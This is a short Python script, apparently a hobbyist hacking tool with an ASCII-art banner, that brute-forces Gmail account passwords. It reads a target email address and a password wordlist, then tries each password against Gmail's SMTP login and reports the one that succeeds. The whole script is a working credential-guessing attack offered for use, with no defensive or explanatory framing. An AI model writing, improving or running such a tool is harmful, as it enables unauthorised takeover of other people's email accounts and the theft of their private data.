import os
os.system('clear')
import time
import smtplib
             # script by Ahmed  #
print('''
 \033[1;32m                __.oOo.__
\033[1;32m                /'(  _  )`\ 
\033[1;32m               / . \/^\/ . \ 
\033[1;32m              /  _)_`-'_(_  \ 
\033[1;32m             /.-~   ).(   ~-.\ 
\033[1;32m            /'     /\_/\     `\ 
\033[1;32m                   "-V-" 
''')

Yasser = smtplib.SMTP_SSL("smtp.gmail.com",465)
Yasser.ehlo()
email = input ("\033[1;35m Enter Your Email : ")
passfile = input ("\033[1;35m Enter Your passfile : ")
passfile = open (passfile ,"r")
for password in passfile:
    try:
        time.sleep(2)
        Yasser.login(email, password)
        print("\033[1;32m password Found ==> " ,password)
        break
    except smtplib.SMTPAuthenticationError:
        print("\033[1;31m password Not Found ==> " ,password)
